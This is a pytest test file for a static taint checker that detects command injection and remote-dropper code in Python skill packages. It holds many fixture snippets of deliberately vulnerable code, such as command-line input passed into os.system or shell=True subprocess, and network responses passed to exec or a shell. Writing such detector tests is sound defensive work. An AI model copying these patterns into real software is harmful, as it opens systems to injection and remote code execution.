"""Tests for the Python source->sink taint check (SXV-008 command injection,
SXV-018 remote dropper).

A finding requires a proven flow from an untrusted source to a shell/exec sink. The
positive cases exercise each source, propagation form, and sink; the negative cases pin
the false-positive guards (constant commands, list-form subprocess, shlex quoting,
constant-dict lookups, network content that is only parsed)."""

from __future__ import annotations

from skill_xray import ingest, parse
from skill_xray.checks import taint_python

_M = "---\nname: t\n---\n"


def _find(make_package, code):
    root = make_package({"SKILL.md": _M, "scripts/x.py": code})
    parsed = parse.parse_package(ingest.build_package(str(root)))
    return taint_python.check(parsed)


def _vectors(findings):
    return {f.vector for f in findings}


# --- positive: command injection (SXV-008) -----------------------------------
def test_argv_into_os_system(make_package):
    f = _find(make_package, "import os, sys\nos.system(sys.argv[1])\n")
    assert "SXV-008" in _vectors(f)


def test_argv_into_subprocess_shell_true(make_package):
    f = _find(make_package, "import subprocess, sys\nsubprocess.run(sys.argv[1], shell=True)\n")
    assert "SXV-008" in _vectors(f)


def test_env_into_shell(make_package):
    f = _find(make_package, "import os, subprocess\nsubprocess.call(os.getenv('X'), shell=True)\n")
    assert "SXV-008" in _vectors(f)


def test_intermediate_assignment_and_fstring(make_package):
    code = ("import os, sys\n"
            "name = sys.argv[1]\n"
            "cmd = f'echo {name}'\n"
            "os.system(cmd)\n")
    assert "SXV-008" in _vectors(_find(make_package, code))


def test_argparse_namespace_attribute(make_package):
    code = ("import argparse, os\n"
            "p = argparse.ArgumentParser()\n"
            "args = p.parse_args()\n"
            "os.system(args.target)\n")
    assert "SXV-008" in _vectors(_find(make_package, code))


def test_interprocedural_positional_binding(make_package):
    code = ("import os, sys\n"
            "def run(x):\n"
            "    os.system(x)\n"
            "run(sys.argv[1])\n")
    assert "SXV-008" in _vectors(_find(make_package, code))


# --- positive: remote dropper (SXV-018) --------------------------------------
def test_requests_text_into_exec(make_package):
    f = _find(make_package, "import requests\nexec(requests.get('http://x').text)\n")
    assert "SXV-018" in _vectors(f)


def test_urlopen_read_into_shell(make_package):
    code = ("import urllib.request, subprocess\n"
            "p = urllib.request.urlopen('http://x')\n"
            "subprocess.run(p.read().decode(), shell=True)\n")
    assert "SXV-018" in _vectors(_find(make_package, code))


# --- negative: false-positive guards -----------------------------------------
def test_constant_command_is_clean(make_package):
    assert _find(make_package, "import os\nos.system('ls -la')\n") == []


def test_list_form_without_shell_is_clean(make_package):
    code = "import subprocess, sys\nsubprocess.run(['echo', sys.argv[1]])\n"
    assert _find(make_package, code) == []


def test_shlex_quote_declassifies(make_package):
    code = ("import os, sys, shlex\n"
            "os.system('echo ' + shlex.quote(sys.argv[1]))\n")
    assert _find(make_package, code) == []


def test_constant_dict_lookup_is_clean(make_package):
    code = ("import os, sys\n"
            "TABLE = {'a': 'ls', 'b': 'pwd'}\n"
            "os.system(TABLE[sys.argv[1]])\n")
    assert _find(make_package, code) == []


def test_network_only_parsed_not_executed(make_package):
    code = ("import requests\n"
            "data = requests.get('http://x').json()\n"
            "print(data)\n")
    assert _find(make_package, code) == []


def test_subprocess_list_argv_no_shell_even_with_network(make_package):
    # a network value in a list-form call without shell is not a shell sink
    code = ("import subprocess, requests\n"
            "subprocess.run(['echo', requests.get('http://x').text])\n")
    assert _find(make_package, code) == []


# --- evidence + determinism --------------------------------------------------
def test_finding_carries_flow_evidence(make_package):
    f = _find(make_package, "import os, sys\nos.system(sys.argv[1])\n")
    ev = f[0].evidence
    assert ev["source_kind"] == "cli_argv" and ev["sink"].startswith("os.system")
    assert len(ev["steps"]) >= 2 and f[0].severity == "critical"
    assert f[0].line == 2


def test_deterministic(make_package):
    code = "import os, sys\nos.system(sys.argv[1])\nos.system(sys.argv[2])\n"
    a = [x.to_dict() for x in _find(make_package, code)]
    b = [x.to_dict() for x in _find(make_package, code)]
    assert a == b and len(a) == 2


# --- Batch 1 review fixes: reproduced false negatives now caught ---------------
def test_sink_inside_class_method(make_package):
    # the review reproduced ZERO flows for sinks in class methods; must now fire
    code = ("import os, sys\n"
            "class Runner:\n"
            "    def run(self):\n"
            "        os.system(sys.argv[1])\n")
    assert "SXV-008" in _vectors(_find(make_package, code))


def test_sink_inside_nested_function(make_package):
    code = ("import os, sys\n"
            "def outer():\n"
            "    def inner():\n"
            "        os.system(sys.argv[1])\n"
            "    inner()\n")
    assert "SXV-008" in _vectors(_find(make_package, code))


def test_method_interprocedural_is_not_followed(make_package):
    # ACCEPTED LIMITATION (precision over recall): self.m()/cls.m() interprocedural flows are
    # NOT followed, because a receiver's runtime type is unknowable statically (self can be
    # rebound by =, :=, for/with/except, match-capture or import-as). A direct sink inside a
    # method IS caught (see test_sink_inside_class_method); only cross-method argument passing
    # is given up, and in exchange the engine never fabricates a critical on a foreign receiver.
    code = ("import os, sys\n"
            "class C:\n"
            "    def run(self, x):\n"
            "        os.system(x)\n"
            "    def go(self):\n"
            "        self.run(sys.argv[1])\n")
    assert _find(make_package, code) == []


def test_subprocess_keyword_args_sink(make_package):
    # command passed as args= keyword, not positional -- previously skipped entirely
    code = "import subprocess, sys\nsubprocess.run(args=sys.argv[1], shell=True)\n"
    assert "SXV-008" in _vectors(_find(make_package, code))


def test_list_built_from_input_then_indexed_is_not_declassified(make_package):
    # a list assembled FROM tainted input is not a constant lookup table
    code = ("import os, sys\n"
            "cmd = ['sh', '-c', sys.argv[1]]\n"
            "os.system(cmd[2])\n")
    assert "SXV-008" in _vectors(_find(make_package, code))


def test_return_value_taint_through_helper(make_package):
    code = ("import os, sys\n"
            "def g():\n"
            "    return sys.argv[1]\n"
            "os.system(g())\n")
    assert "SXV-008" in _vectors(_find(make_package, code))


def test_helper_returning_constant_stays_clean(make_package):
    # the return-taint pass must not over-fire on a helper that returns a constant
    code = ("import os\n"
            "def g():\n"
            "    return 'ls -la'\n"
            "os.system(g())\n")
    assert _find(make_package, code) == []


# --- edge-case review: cross-scope name collisions (no eviction, no misresolution) ---
def test_same_named_method_does_not_evict_top_level_flow(make_package):
    # appending a benign same-named method must NOT hide a real top-level injection
    code = ("import os, sys\n"
            "def deploy():\n"
            "    os.system(sys.argv[1])\n"
            "class Ops:\n"
            "    def deploy(self):\n"
            "        pass\n")
    assert "SXV-008" in _vectors(_find(make_package, code))


def test_method_call_does_not_misresolve_across_classes(make_package):
    # s.handle() targets the benign Safe.handle; must not fabricate a flow into Danger.handle
    code = ("import os, sys\n"
            "class Safe:\n"
            "    def handle(self, x):\n"
            "        return x.upper()\n"
            "class Danger:\n"
            "    def handle(self, x):\n"
            "        os.system(x)\n"
            "s = Safe()\n"
            "s.handle(sys.argv[1])\n")
    assert _find(make_package, code) == []


def test_return_taint_does_not_misresolve_across_classes(make_package):
    code = ("import os, sys\n"
            "class A:\n"
            "    def fetch(self):\n"
            "        return 'safe'\n"
            "class B:\n"
            "    def fetch(self):\n"
            "        return sys.argv[1]\n"
            "a = A()\n"
            "os.system(a.fetch())\n")
    assert _find(make_package, code) == []


def test_same_named_method_does_not_evict_laundering_helper(make_package):
    code = ("import os, sys\n"
            "def g():\n"
            "    return sys.argv[1]\n"
            "os.system(g())\n"
            "class C:\n"
            "    def g(self):\n"
            "        return 'x'\n")
    assert "SXV-008" in _vectors(_find(make_package, code))


# --- re-verify: receiver-aware method resolution + nested-scope bare calls ------
def test_method_on_unrelated_stdlib_object_is_not_a_flow(make_package):
    # conn.send(argv) on an smtplib.SMTP must NOT resolve to a lone user Cmd.send
    code = ("import os, sys, smtplib\n"
            "class Cmd:\n"
            "    def send(self, x):\n"
            "        os.system(x)\n"
            "conn = smtplib.SMTP('h')\n"
            "conn.send(sys.argv[1])\n")
    assert _find(make_package, code) == []


def test_return_launder_on_unrelated_object_is_not_a_flow(make_package):
    code = ("import os, sys, socket\n"
            "class A:\n"
            "    def fetch(self):\n"
            "        return sys.argv[1]\n"
            "c = socket.socket()\n"
            "os.system(c.fetch())\n")
    assert _find(make_package, code) == []


def test_nested_helper_return_launder_is_caught(make_package):
    code = ("import os, sys\n"
            "def outer():\n"
            "    def h():\n"
            "        return sys.argv[1]\n"
            "    os.system(h())\n"
            "outer()\n")
    assert "SXV-008" in _vectors(_find(make_package, code))


def test_nested_helper_positional_bind_is_caught(make_package):
    code = ("import os, sys\n"
            "def outer():\n"
            "    def h(x):\n"
            "        os.system(x)\n"
            "    h(sys.argv[1])\n"
            "outer()\n")
    assert "SXV-008" in _vectors(_find(make_package, code))


# --- converge: self/cls resolution requires the real bound receiver, unrebound ---
def test_rebound_self_does_not_resolve(make_package):
    code = ("import os, sys\n"
            "class C:\n"
            "    def handle(self):\n"
            "        self = self.backend\n"
            "        os.system(self.command())\n"
            "    def command(self):\n"
            "        return sys.argv[1]\n")
    assert _find(make_package, code) == []


def test_staticmethod_self_reference_does_not_resolve(make_package):
    code = ("import os, sys\n"
            "class C:\n"
            "    @staticmethod\n"
            "    def handle():\n"
            "        os.system(self.command())\n"
            "    def command(self):\n"
            "        return sys.argv[1]\n")
    assert _find(make_package, code) == []


# --- round-4: receiver rebinding via any form; nested-scope isolation ----------
def test_walrus_rebound_self_does_not_resolve(make_package):
    code = ("import os, sys\n"
            "class C:\n"
            "    def h(self):\n"
            "        x = (self := self.backend)\n"
            "        os.system(self.command())\n"
            "    def command(self):\n"
            "        return sys.argv[1]\n")
    assert _find(make_package, code) == []


def test_for_target_rebound_self_does_not_resolve(make_package):
    code = ("import os, sys\n"
            "class C:\n"
            "    def h(self):\n"
            "        for self in self.backends:\n"
            "            os.system(self.command())\n"
            "    def command(self):\n"
            "        return sys.argv[1]\n")
    assert _find(make_package, code) == []




# --- round-5: the whole receiver-resolution FP class is gone (self.m not resolved) ---
def test_match_capture_rebound_self_no_false_positive(make_package):
    code = ("import os, sys\n"
            "class C:\n"
            "    def run(self, o):\n"
            "        match o:\n"
            "            case _ as self:\n"
            "                self.m(sys.argv[1])\n"
            "    def m(self, c):\n"
            "        os.system(c)\n")
    assert _find(make_package, code) == []


def test_import_as_self_no_false_positive(make_package):
    code = ("import os, sys\n"
            "class C:\n"
            "    def run(self):\n"
            "        import shutil as self\n"
            "        self.m(sys.argv[1])\n"
            "    def m(self, c):\n"
            "        os.system(c)\n")
    assert _find(make_package, code) == []


# --- round-6: dict- and JSON-mediated taint, tracked per constant key ----------------
def test_dict_constant_key_carries_taint(make_package):
    code = ("import os, sys\n"
            "d = {'cmd': sys.argv[1]}\n"
            "os.system(d['cmd'])\n")
    assert "SXV-008" in _vectors(_find(make_package, code))


def test_dict_get_constant_key_carries_taint(make_package):
    code = ("import os, sys\n"
            "d = {'cmd': sys.argv[1]}\n"
            "os.system(d.get('cmd'))\n")
    assert "SXV-008" in _vectors(_find(make_package, code))


def test_dict_untainted_key_stays_clean(make_package):
    # per-key tracking: reading the constant 'safe' value must not inherit the taint on 'u'.
    code = ("import os, sys\n"
            "d = {'safe': 'ls', 'u': sys.argv[1]}\n"
            "os.system(d['safe'])\n")
    assert _find(make_package, code) == []


def test_dict_dynamic_key_stays_clean(make_package):
    # a variable key is not constant-folded, so a per-key dict is not resolved rather than guessed.
    code = ("import os, sys\n"
            "d = {'cmd': sys.argv[1]}\n"
            "k = 'cmd'\n"
            "os.system(d[k])\n")
    assert _find(make_package, code) == []


def test_json_network_index_is_remote_dropper(make_package):
    code = ("import os, requests\n"
            "data = requests.get('http://127.0.0.1/x').json()\n"
            "os.system(data['cmd'])\n")
    assert "SXV-018" in _vectors(_find(make_package, code))


# --- PR3a: fail-open isolation, recursion bound, splat, posonly/keyword binder --------
def _bomb(terms=3000):
    # A deeply nested BinOp `os.system("a"+"a"+...+"a")`: parses fine but drove _taint_of into
    # an unbounded recursion (a whole-check crash before the depth bound). Inert: constant only.
    return "import os\nos.system(" + "+".join(['"a"'] * terms) + ")\n"


def test_recursion_bomb_sibling_not_dropped(make_package):
    # ISOLATION: one poisoned artifact must not lose a real sibling's flow. Before the fix the
    # RecursionError propagated out of check() and dropped every taint finding for the package.
    root = make_package({"SKILL.md": _M,
                         "scripts/real.py": "import os, sys\nos.system(sys.argv[1])\n",
                         "scripts/bomb.py": _bomb()})
    parsed = parse.parse_package(ingest.build_package(str(root)))
    findings = taint_python.check(parsed)
    assert "SXV-008" in _vectors(findings)
    assert any(f.path == "scripts/real.py" and f.vector == "SXV-008" for f in findings)


def test_recursion_bomb_completes_without_crashing(make_package):
    # BOUND: the nested expression no longer raises; the scan completes and the bound handles it
    # cleanly (no per-artifact check-error, which would mean the crash-catch fired instead).
    findings = _find(make_package, _bomb())          # must not raise
    assert not any(f.rule == "check-error" for f in findings)


def test_starred_splat_argument_propagates(make_package):
    code = ("import os, sys\n"
            "def run(x):\n"
            "    os.system(x)\n"
            "run(*[sys.argv[1]])\n")
    assert "SXV-008" in _vectors(_find(make_package, code))


def test_positional_only_param_binds(make_package):
    # posonlyargs were dropped from the binder, so a `cmd, /` parameter was never bound: an FN.
    code = ("import os, sys\n"
            "def run(cmd, /):\n"
            "    os.system(cmd)\n"
            "run(sys.argv[1])\n")
    assert "SXV-008" in _vectors(_find(make_package, code))


def test_positional_only_param_does_not_misbind(make_package):
    # Dropping the posonly `cmd` also shifted the tainted argv onto `safe` -- a wrong-param FP.
    # With posonlyargs restored, argv binds `cmd` (clean sink reads `safe`), so nothing fires.
    code = ("import os, sys\n"
            "def run(cmd, /, safe):\n"
            "    os.system(safe)\n"
            "run(sys.argv[1], 'ls')\n")
    assert "SXV-008" not in _vectors(_find(make_package, code))


def test_keyword_argument_binds(make_package):
    code = ("import os, sys\n"
            "def run(cmd):\n"
            "    os.system(cmd)\n"
            "run(cmd=sys.argv[1])\n")
    assert "SXV-008" in _vectors(_find(make_package, code))
